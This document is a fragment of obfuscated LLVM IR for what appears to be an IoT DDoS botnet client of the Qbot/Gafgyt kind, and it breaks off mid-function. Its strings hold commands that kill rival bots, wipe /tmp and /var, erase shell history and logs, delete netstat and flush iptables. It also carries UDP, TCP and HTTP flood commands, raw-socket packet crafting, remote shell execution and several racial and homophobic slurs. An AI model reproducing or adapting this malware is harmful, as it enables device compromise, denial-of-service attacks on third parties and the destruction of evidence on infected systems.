@.str.403 = private unnamed_addr constant [9 x i8] c"qsortEQS\00", align 1
@.str.404 = private unnamed_addr constant [16 x i8] c"8969876hjkghblk\00", align 1
@.str.405 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.406 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.407 = private unnamed_addr constant [6 x i8] c"hackz\00", align 1
@.str.408 = private unnamed_addr constant [7 x i8] c"shdyed\00", align 1
@.str.409 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.410 = private unnamed_addr constant [10 x i8] c"sghwiondc\00", align 1
@.str.411 = private unnamed_addr constant [7 x i8] c"nigger\00", align 1
@.str.412 = private unnamed_addr constant [6 x i8] c"pussy\00", align 1
@.str.413 = private unnamed_addr constant [7 x i8] c"faggot\00", align 1
@.str.414 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.415 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.416 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.417 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.418 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.419 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.420 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.421 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.422 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.423 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@botkiller.teldirs = private unnamed_addr constant [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.29, i32 0, i32 0), i8* null], align 16
@botkiller.Boats = private unnamed_addr constant [23 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.424, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.425, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.426, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.427, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.428, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.429, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.430, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.431, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.432, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.433, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.434, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.435, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.436, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.437, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.438, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.439, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.440, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.441, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.442, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.443, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.444, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.445, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.445, i32 0, i32 0)], align 16
@botkiller.bots = private unnamed_addr constant [16 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.446, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.447, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.448, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.432, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.437, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.449, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.450, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.431, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.451, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.452, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.453, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.435, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.426, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.436, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.428, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.454, i32 0, i32 0)], align 16
@.str.455 = private unnamed_addr constant [100 x i8] c">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\0D\0A\00", align 1
@.str.456 = private unnamed_addr constant [29 x i8] c">%s.t && cd %s ; >retrieve\0D\0A\00", align 1
@.str.457 = private unnamed_addr constant [14 x i8] c"pkill -9 %s\0D\0A\00", align 1
@.str.446 = private unnamed_addr constant [8 x i8] c"jackmy*\00", align 1
@.str.447 = private unnamed_addr constant [9 x i8] c"busybox*\00", align 1
@.str.448 = private unnamed_addr constant [5 x i8] c"bin*\00", align 1
@.str.432 = private unnamed_addr constant [5 x i8] c"sex*\00", align 1
@.str.437 = private unnamed_addr constant [6 x i8] c"tftp*\00", align 1
@.str.449 = private unnamed_addr constant [5 x i8] c"arm*\00", align 1
@.str.450 = private unnamed_addr constant [8 x i8] c"mipsel*\00", align 1
@.str.431 = private unnamed_addr constant [6 x i8] c"mips*\00", align 1
@.str.451 = private unnamed_addr constant [8 x i8] c"mips64*\00", align 1
@.str.452 = private unnamed_addr constant [6 x i8] c"i686*\00", align 1
@.str.453 = private unnamed_addr constant [7 x i8] c"sparc*\00", align 1
@.str.435 = private unnamed_addr constant [5 x i8] c"sh4*\00", align 1
@.str.426 = private unnamed_addr constant [5 x i8] c"bot*\00", align 1
@.str.436 = private unnamed_addr constant [11 x i8] c"jackmeoff*\00", align 1
@.str.428 = private unnamed_addr constant [7 x i8] c"hackz*\00", align 1
@.str.454 = private unnamed_addr constant [6 x i8] c"bruv*\00", align 1
@.str.424 = private unnamed_addr constant [5 x i8] c"wget\00", align 1
@.str.425 = private unnamed_addr constant [6 x i8] c"armv*\00", align 1
@.str.427 = private unnamed_addr constant [6 x i8] c"ntpd*\00", align 1
@.str.429 = private unnamed_addr constant [8 x i8] c"shitty*\00", align 1
@.str.430 = private unnamed_addr constant [6 x i8] c"jack*\00", align 1
@.str.433 = private unnamed_addr constant [4 x i8] c"i86\00", align 1
@.str.434 = private unnamed_addr constant [5 x i8] c"ssh*\00", align 1
@.str.438 = private unnamed_addr constant [4 x i8] c"i56\00", align 1
@.str.439 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.440 = private unnamed_addr constant [7 x i8] c"mipsel\00", align 1
@.str.441 = private unnamed_addr constant [4 x i8] c"sh4\00", align 1
@.str.442 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.443 = private unnamed_addr constant [5 x i8] c"i686\00", align 1
@.str.444 = private unnamed_addr constant [4 x i8] c"ppc\00", align 1
@.str.445 = private unnamed_addr constant [5 x i8] c"i586\00", align 1
@.str.458 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.459 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.460 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.461 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.462 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.463 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.464 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.465 = private unnamed_addr constant [11 x i8] c"history -w\00", align 1
@.str.466 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.467 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.468 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.469 = private unnamed_addr constant [36 x i8] c"/sbin/iptables -F;/sbin/iptables -X\00", align 1
@.str.470 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.471 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.472 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.473 = private unnamed_addr constant [8 x i8] c"BOTKILL\00", align 1
@.str.474 = private unnamed_addr constant [27 x i8] c"[BOTKILLER] [STARTED] [%s]\00", align 1
@.str.475 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.476 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.477 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.478 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.479 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.480 = private unnamed_addr constant [38 x i8] c"HTTP %s Flooding %s:%d for %d seconds\00", align 1
@.str.481 = private unnamed_addr constant [6 x i8] c"PHONE\00", align 1
@.str.482 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.483 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.484 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.485 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.486 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.487 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.488 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.489 = private unnamed_addr constant [6 x i8] c"HITTA\00", align 1
@.str.490 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.491 = private unnamed_addr constant [23 x i8] c"[CONNECTED] [%s] [%s]\0A\00", align 1
@.str.492 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.493 = private unnamed_addr constant [29 x i8] c"\1B[0;32m[CONNECTED] [%s] [%s]\00", align 1
@.str.494 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.495 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.496 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.497 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.498 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.499 = private unnamed_addr constant [19 x i8] c"BYE MISTER HITTA!\0A\00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  %switchVar = alloca i32
  store i32 -167260462, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -167260462, label %10
    i32 -2041536232, label %14
    i32 1968610227, label %32
    i32 -1137689357, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  %13 = select i1 %12, i32 -2041536232, i32 -1137689357
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %3, align 4
  %16 = sub nsw i32 %15, 3
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %17
  %19 = load i32, i32* %18, align 4
  %20 = load i32, i32* %3, align 4
  %21 = sub nsw i32 %20, 2
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %22
  %24 = load i32, i32* %23, align 4
  %25 = xor i32 %19, %24
  %26 = xor i32 %25, -1640531527
  %27 = load i32, i32* %3, align 4
  %28 = xor i32 %26, %27
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %30
  store i32 %28, i32* %31, align 4
  store i32 1968610227, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %3, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %3, align 4
  store i32 -167260462, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %32, %14, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  store i32 %26, i32* %.reg2mem
  %27 = load i32, i32* @c, align 4
  store i32 %27, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 -988255321, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -988255321, label %first
    i32 -1575445828, label %30
    i32 115395209, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %28 = icmp ult i32 %.reload, %.reload3
  %29 = select i1 %28, i32 -1575445828, i32 115395209
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %3, align 4
  %32 = add i32 %31, 1
  store i32 %32, i32* %3, align 4
  %33 = load i32, i32* @c, align 4
  %34 = add i32 %33, 1
  store i32 %34, i32* @c, align 4
  store i32 115395209, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %4, align 4
  %37 = load i32, i32* %3, align 4
  %38 = sub i32 %36, %37
  %39 = load i32, i32* @rand_cmwc.i, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %40
  store i32 %38, i32* %41, align 4
  ret i32 %38

loopEnd:                                          ; preds = %30, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  %switchVar = alloca i32
  store i32 192991830, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 192991830, label %10
    i32 1446291086, label %20
    i32 1823003124, label %23
    i32 -1044983037, label %24
    i32 994355327, label %29
    i32 -978782661, label %38
    i32 -153798351, label %40
    i32 -838530958, label %43
    i32 -642757848, label %45
    i32 1243641288, label %50
    i32 -172818085, label %62
    i32 -867126399, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  %19 = select i1 %18, i32 1446291086, i32 1823003124
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %4, align 4
  store i32 192991830, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i32 -1044983037, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %5, align 4
  %26 = load i32, i32* %4, align 4
  %27 = icmp sge i32 %25, %26
  %28 = select i1 %27, i32 994355327, i32 -978782661
  store i32 %28, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8*, i8** %2, align 8
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = call i32 @isspace(i32 %35) #10
  %37 = icmp ne i32 %36, 0
  store i32 -978782661, i32* %switchVar
  store i1 %37, i1* %.reg2mem
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %39 = select i1 %.reload, i32 -153798351, i32 -838530958
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %5, align 4
  %42 = add nsw i32 %41, -1
  store i32 %42, i32* %5, align 4
  store i32 -1044983037, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i32, i32* %4, align 4
  store i32 %44, i32* %3, align 4
  store i32 -642757848, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %3, align 4
  %47 = load i32, i32* %5, align 4
  %48 = icmp sle i32 %46, %47
  %49 = select i1 %48, i32 1243641288, i32 -867126399
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %2, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = load i8*, i8** %2, align 8
  %57 = load i32, i32* %3, align 4
  %58 = load i32, i32* %4, align 4
  %59 = sub nsw i32 %57, %58
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %56, i64 %60
  store i8 %55, i8* %61, align 1
  store i32 -172818085, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %3, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %3, align 4
  store i32 -642757848, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i8*, i8** %2, align 8
  %67 = load i32, i32* %3, align 4
  %68 = load i32, i32* %4, align 4
  %69 = sub nsw i32 %67, %68
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %66, i64 %70
  store i8 0, i8* %71, align 1
  ret void

loopEnd:                                          ; preds = %62, %50, %45, %43, %40, %38, %29, %24, %23, %20, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @filter(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %switchVar = alloca i32
  store i32 559485906, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 559485906, label %3
    i32 1632427270, label %13
    i32 -2019869328, label %22
    i32 -2062668267, label %24
    i32 461613893, label %30
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:3:                                      ; preds = %loopEntry
  %4 = load i8*, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = call i64 @strlen(i8* %5) #10
  %7 = sub i64 %6, 1
  %8 = getelementptr inbounds i8, i8* %4, i64 %7
  %9 = load i8, i8* %8, align 1
  %10 = sext i8 %9 to i32
  %11 = icmp eq i32 %10, 13
  %12 = select i1 %11, i32 -2019869328, i32 1632427270
  store i32 %12, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i8*, i8** %2, align 8
  %15 = load i8*, i8** %2, align 8
  %16 = call i64 @strlen(i8* %15) #10
  %17 = sub i64 %16, 1
  %18 = getelementptr inbounds i8, i8* %14, i64 %17
  %19 = load i8, i8* %18, align 1
  %20 = sext i8 %19 to i32
  %21 = icmp eq i32 %20, 10
  store i32 -2019869328, i32* %switchVar
  store i1 %21, i1* %.reg2mem
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %23 = select i1 %.reload, i32 -2062668267, i32 461613893
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %2, align 8
  %26 = load i8*, i8** %2, align 8
  %27 = call i64 @strlen(i8* %26) #10
  %28 = sub i64 %27, 1
  %29 = getelementptr inbounds i8, i8* %25, i64 %28
  store i8 0, i8* %29, align 1
  store i32 559485906, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %24, %22, %13, %3, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i8* @makestring() #0 {
  %.reg2mem = alloca %struct._IO_FILE*
  %1 = alloca i8*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [1024 x i8], align 16
  %8 = call i32 @rand() #5
  %9 = srem i32 %8, 5
  %10 = add nsw i32 %9, 4
  store i32 %10, i32* %2, align 4
  %11 = load i32, i32* %2, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = call noalias i8* @malloc(i64 %13) #5
  store i8* %14, i8** %1, align 8
  %15 = load i8*, i8** %1, align 8
  %16 = load i32, i32* %2, align 4
  %17 = add nsw i32 %16, 1
  %18 = sext i32 %17 to i64
  call void @llvm.memset.p0i8.i64(i8* %15, i8 0, i64 %18, i32 1, i1 false)
  %19 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.33, i32 0, i32 0))
  store %struct._IO_FILE* %19, %struct._IO_FILE** %.reg2mem
  %.reload2 = load volatile %struct._IO_FILE*, %struct._IO_FILE** %.reg2mem
  store %struct._IO_FILE* %.reload2, %struct._IO_FILE** %4, align 8
  %switchVar = alloca i32
  store i32 2069741626, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2069741626, label %first
    i32 465327698, label %22
    i32 2079610686, label %23
    i32 1538207572, label %28
    i32 864182169, label %37
    i32 1157181820, label %40
    i32 -498169020, label %41
    i32 -580685717, label %47
    i32 -1966198971, label %52
    i32 -202998637, label %56
    i32 -1603762137, label %59
    i32 -1776778048, label %71
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct._IO_FILE*, %struct._IO_FILE** %.reg2mem
  %20 = icmp eq %struct._IO_FILE* %.reload, null
  %21 = select i1 %20, i32 465327698, i32 -498169020
  store i32 %21, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 2079610686, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %3, align 4
  %25 = load i32, i32* %2, align 4
  %26 = icmp slt i32 %24, %25
  %27 = select i1 %26, i32 1538207572, i32 1157181820
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = call i32 @rand() #5
  %30 = srem i32 %29, 26
  %31 = add nsw i32 %30, 65
  %32 = trunc i32 %31 to i8
  %33 = load i8*, i8** %1, align 8
  %34 = load i32, i32* %3, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %33, i64 %35
  store i8 %32, i8* %36, align 1
  store i32 864182169, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %3, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %3, align 4
  store i32 2079610686, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  store i32 -1776778048, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = call i32 @rand() #5
  %43 = call i32 @rand() #5
  %44 = mul nsw i32 %42, %43
  %45 = srem i32 %44, 45402
  %46 = add nsw i32 %45, 1
  store i32 %46, i32* %6, align 4
  store i32 0, i32* %3, align 4
  store i32 -580685717, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i32, i32* %3, align 4
  %49 = load i32, i32* %6, align 4
  %50 = icmp slt i32 %48, %49
  %51 = select i1 %50, i32 -1966198971, i32 -1603762137
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  %54 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %55 = call i8* @fgets(i8* %53, i32 1024, %struct._IO_FILE* %54)
  store i32 -202998637, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i32, i32* %3, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* %3, align 4
  store i32 -580685717, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %60, i8 0, i64 1024, i32 16, i1 false)
  %61 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  %62 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %63 = call i8* @fgets(i8* %61, i32 1024, %struct._IO_FILE* %62)
  %64 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
